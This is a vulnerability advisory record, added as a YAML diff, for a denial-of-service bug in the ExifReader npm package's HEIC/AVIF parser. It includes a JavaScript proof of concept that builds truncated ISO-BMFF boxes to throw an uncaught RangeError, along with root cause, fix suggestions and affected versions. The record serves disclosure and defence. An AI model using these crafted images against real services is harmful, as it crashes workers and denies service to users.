@@ -1,0 +1,266 @@
+advisory_id: GHSA-g77h-45rf-hcx4
+datasource_id: github_osv/GHSA-g77h-45rf-hcx4
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-g77h-45rf-hcx4/GHSA-g77h-45rf-hcx4.json
+aliases:
+  - CVE-2026-53496
+summary: |
+  ExifReader HEIC/AVIF ISO-BMFF parser throws uncaught RangeError on truncated boxes
+  ## Summary
+
+  ExifReader 4.40.0 can throw an uncaught `RangeError: Offset is outside the bounds of the DataView` while parsing crafted HEIC/AVIF files. The file only needs a valid leading `ftyp` box with a HEIC/AVIF major brand followed by a malformed ISO-BMFF box, such as an empty 8-byte `free` box or a truncated extended-size box.
+
+  This is reachable through the public `ExifReader.load()` API for in-memory buffers and through the async file/URL loaders when an application parses attacker-supplied images. In applications that do not wrap every parse in a defensive try/catch, a single uploaded or fetched image can abort the request/worker and cause a denial of service.
+
+  Credit requested: Yaohui Wang.
+
+  ## Affected version tested
+
+  - npm package: `exifreader`
+  - Version: `4.40.0`
+  - Repository commit tested: `8cb0261a26b7d986955fe0a6780f076dcb7902e7`
+
+  ## Root cause
+
+  The ISO-BMFF parser assumes that every top-level box with at least an 8-byte header also has enough bytes for the fields required by its parsed form. In `src/image-header-iso-bmff.js`:
+
+  - `findMetaBox()` calls `parseBox(dataView, offset)` while only checking that `offset + 8 <= dataView.byteLength`.
+  - `parseBox()` calls `getBoxLength()` and then unconditionally reads fields such as the full-box version byte for `meta`/`iloc`/`iinf`/`idat` boxes.
+  - `getBoxLength()` handles `boxLength === 1` by calling `hasEmptyHighBits(dataView, offset)`, which reads `dataView.getUint32(offset + 8)` without first checking that the 64-bit extended size field is present.
+
+  As a result, syntactically small or truncated boxes after a valid HEIC/AVIF `ftyp` box escape the format-detection catch blocks and throw from the main parsing path.
+
+  ## Reproduction
+
+  Run this from the repository root against the committed `dist/exif-reader.js` bundle:
+
+  ```js
+  const ExifReader = require('./dist/exif-reader.js');
+
+  function u32be(n) {
+    return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255];
+  }
+  function ascii(s) {
+    return Array.from(Buffer.from(s, 'ascii'));
+  }
+  function box(type, content = []) {
+    return [...u32be(8 + content.length), ...ascii(type), ...content];
+  }
+
+  for (const brand of ['heic', 'avif']) {
+    for (const badBox of ['free', 'abcd']) {
+      const bytes = Uint8Array.from([
+        ...box('ftyp', ascii(brand)),
+        ...box(badBox), // 8-byte box header with no content
+      ]);
+
+      try {
+        ExifReader.load(bytes.buffer);
+        console.log(`${brand}/${badBox}: no throw`);
+      } catch (e) {
+        console.log(`${brand}/${badBox}: ${e.name}: ${e.message}`);
+        console.log(String(e.stack).split('\n').slice(0, 6).join('\n'));
+      }
+    }
+  }
+  ```
+
+  Observed output on Node v23.11.0 with ExifReader 4.40.0:
+
+  ```text
+  heic/free: RangeError: Offset is outside the bounds of the DataView
+  RangeError: Offset is outside the bounds of the DataView
+      at DataView.prototype.getUint8 (<anonymous>)
+      at parseBox (.../dist/exif-reader.js:1:16513)
+      at findMetaBox (.../dist/exif-reader.js:1:19032)
+      at findOffsets (.../dist/exif-reader.js:1:19101)
+
+  heic/abcd: RangeError: Offset is outside the bounds of the DataView
+  avif/free: RangeError: Offset is outside the bounds of the DataView
+  avif/abcd: RangeError: Offset is outside the bounds of the DataView
+  ```
+
+  A second variant triggers the extended-size path:
+
+  ```js
+  const truncatedExtendedBox = [...u32be(1), ...ascii('free')];
+  const heic = Uint8Array.from([...box('ftyp', ascii('heic')), ...truncatedExtendedBox]);
+  ExifReader.load(heic.buffer);
+  ```
+
+  That throws from `hasEmptyHighBits()` / `getBoxLength()` because the extended-size high/low fields are not present.
+
+  ## Expected behavior
+
+  Malformed/truncated metadata boxes should be handled like other malformed metadata in the project: return only the successfully parsed file type/metadata, return no app markers, or throw a controlled project-specific error. A safe JavaScript bounds error should not escape from the parser for an attacker-controlled image container.
+
+  ## Security impact
+
+  This is a denial-of-service issue for services that parse user-provided HEIC/AVIF files with ExifReader. A minimal attacker-controlled image buffer can cause an unhandled exception in the parser and abort the surrounding request/worker if the embedding application does not catch every parse error.
+
+  Suggested severity: Medium. Suggested CVSS: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`.
+
+  ## Suggested fix
+
+  Add explicit bounds checks before every `DataView` read in the ISO-BMFF box parser, especially:
+
+  - before reading the 64-bit extended size fields in `getBoxLength()`;
+  - before reading the full-box version byte in `parseBox()`;
+  - before descending into `parseSubBoxes()` when a declared box length exceeds available bytes;
+  - ensure `findMetaBox()` breaks on boxes whose declared length is invalid or not fully present.
+
+  A regression test should cover `ftyp/heic` and `ftyp/avif` followed by an 8-byte empty `free`/unknown box and by a truncated extended-size box.
+impacted_packages:
+  - purl: pkg:npm/exifreader
+    affected_versions: vers:npm/<=4.40.0
+    fixed_versions: vers:npm/4.40.1
+    affected_packages:
+      - pkg:npm/exifreader@2.0.0
+      - pkg:npm/exifreader@2.0.1
+      - pkg:npm/exifreader@2.1.0
+      - pkg:npm/exifreader@2.1.1
+      - pkg:npm/exifreader@2.1.2
+      - pkg:npm/exifreader@2.2.0
+      - pkg:npm/exifreader@2.3.0
+      - pkg:npm/exifreader@2.4.0
+      - pkg:npm/exifreader@2.4.2
+      - pkg:npm/exifreader@2.5.0
+      - pkg:npm/exifreader@2.6.0
+      - pkg:npm/exifreader@2.7.0
+      - pkg:npm/exifreader@2.8.1
+      - pkg:npm/exifreader@2.8.2
+      - pkg:npm/exifreader@2.8.3
+      - pkg:npm/exifreader@2.8.5
+      - pkg:npm/exifreader@2.9.0
+      - pkg:npm/exifreader@2.10.0
+      - pkg:npm/exifreader@2.11.0
+      - pkg:npm/exifreader@2.12.0
+      - pkg:npm/exifreader@2.13.0
+      - pkg:npm/exifreader@2.13.1
+      - pkg:npm/exifreader@3.0.0
+      - pkg:npm/exifreader@3.1.0
+      - pkg:npm/exifreader@3.2.0
+      - pkg:npm/exifreader@3.3.0
+      - pkg:npm/exifreader@3.4.0
+      - pkg:npm/exifreader@3.5.0
+      - pkg:npm/exifreader@3.6.0
+      - pkg:npm/exifreader@3.6.1
+      - pkg:npm/exifreader@3.7.0
+      - pkg:npm/exifreader@3.8.0
+      - pkg:npm/exifreader@3.9.0
+      - pkg:npm/exifreader@3.10.0
+      - pkg:npm/exifreader@3.11.0
+      - pkg:npm/exifreader@3.11.1
+      - pkg:npm/exifreader@3.11.2
+      - pkg:npm/exifreader@3.12.0
+      - pkg:npm/exifreader@3.12.1
+      - pkg:npm/exifreader@3.12.2
+      - pkg:npm/exifreader@3.12.3
+      - pkg:npm/exifreader@3.12.4
+      - pkg:npm/exifreader@3.12.5
+      - pkg:npm/exifreader@3.12.6
+      - pkg:npm/exifreader@3.13.0
+      - pkg:npm/exifreader@3.14.0
+      - pkg:npm/exifreader@3.14.1
+      - pkg:npm/exifreader@3.15.0
+      - pkg:npm/exifreader@3.16.0
+      - pkg:npm/exifreader@4.0.0
+      - pkg:npm/exifreader@4.1.0
+      - pkg:npm/exifreader@4.1.1
+      - pkg:npm/exifreader@4.2.0
+      - pkg:npm/exifreader@4.3.0
+      - pkg:npm/exifreader@4.3.1
+      - pkg:npm/exifreader@4.4.0
+      - pkg:npm/exifreader@4.5.0
+      - pkg:npm/exifreader@4.5.1
+      - pkg:npm/exifreader@4.6.0
+      - pkg:npm/exifreader@4.7.0
+      - pkg:npm/exifreader@4.8.0
+      - pkg:npm/exifreader@4.8.1
+      - pkg:npm/exifreader@4.9.0
+      - pkg:npm/exifreader@4.9.1
+      - pkg:npm/exifreader@4.9.2
+      - pkg:npm/exifreader@4.10.0
+      - pkg:npm/exifreader@4.11.0
+      - pkg:npm/exifreader@4.11.1
+      - pkg:npm/exifreader@4.12.0
+      - pkg:npm/exifreader@4.12.1
+      - pkg:npm/exifreader@4.13.0
+      - pkg:npm/exifreader@4.13.1
+      - pkg:npm/exifreader@4.13.2
+      - pkg:npm/exifreader@4.14.0
+      - pkg:npm/exifreader@4.14.1
+      - pkg:npm/exifreader@4.15.0
+      - pkg:npm/exifreader@4.16.0
+      - pkg:npm/exifreader@4.17.0
+      - pkg:npm/exifreader@4.18.0
+      - pkg:npm/exifreader@4.19.0
+      - pkg:npm/exifreader@4.19.1
+      - pkg:npm/exifreader@4.20.0
+      - pkg:npm/exifreader@4.21.0
+      - pkg:npm/exifreader@4.21.1
+      - pkg:npm/exifreader@4.22.0
+      - pkg:npm/exifreader@4.22.1
+      - pkg:npm/exifreader@4.23.1
+      - pkg:npm/exifreader@4.23.2
+      - pkg:npm/exifreader@4.23.3
+      - pkg:npm/exifreader@4.23.4
+      - pkg:npm/exifreader@4.23.5
+      - pkg:npm/exifreader@4.23.6
+      - pkg:npm/exifreader@4.23.7
+      - pkg:npm/exifreader@4.24.0
+      - pkg:npm/exifreader@4.25.0
+      - pkg:npm/exifreader@4.26.0
+      - pkg:npm/exifreader@4.26.1
+      - pkg:npm/exifreader@4.26.2
+      - pkg:npm/exifreader@4.27.0
+      - pkg:npm/exifreader@4.28.0
+      - pkg:npm/exifreader@4.28.1
+      - pkg:npm/exifreader@4.29.0
+      - pkg:npm/exifreader@4.30.0
+      - pkg:npm/exifreader@4.30.1
+      - pkg:npm/exifreader@4.31.0
+      - pkg:npm/exifreader@4.31.1
+      - pkg:npm/exifreader@4.31.2
+      - pkg:npm/exifreader@4.32.0
+      - pkg:npm/exifreader@4.33.1
+      - pkg:npm/exifreader@4.34.0
+      - pkg:npm/exifreader@4.35.0
+      - pkg:npm/exifreader@4.36.0
+      - pkg:npm/exifreader@4.36.1
+      - pkg:npm/exifreader@4.36.2
+      - pkg:npm/exifreader@4.37.0
+      - pkg:npm/exifreader@4.37.1
+      - pkg:npm/exifreader@4.38.0
+      - pkg:npm/exifreader@4.38.1
+      - pkg:npm/exifreader@4.39.0
+      - pkg:npm/exifreader@4.39.1
+      - pkg:npm/exifreader@4.40.0
+    fixed_packages:
+      - pkg:npm/exifreader@4.40.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-g77h-45rf-hcx4/GHSA-g77h-45rf-hcx4.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-755
+  - CWE-248
+references:
+  - url: https://github.com/mattiasw/ExifReader
+    reference_type:
+    reference_id:
+  - url: https://github.com/mattiasw/ExifReader/releases/tag/v4.40.1
+    reference_type:
+    reference_id:
+  - url: https://github.com/mattiasw/ExifReader/security/advisories/GHSA-g77h-45rf-hcx4
+    reference_type:
+    reference_id:
+exploits: []
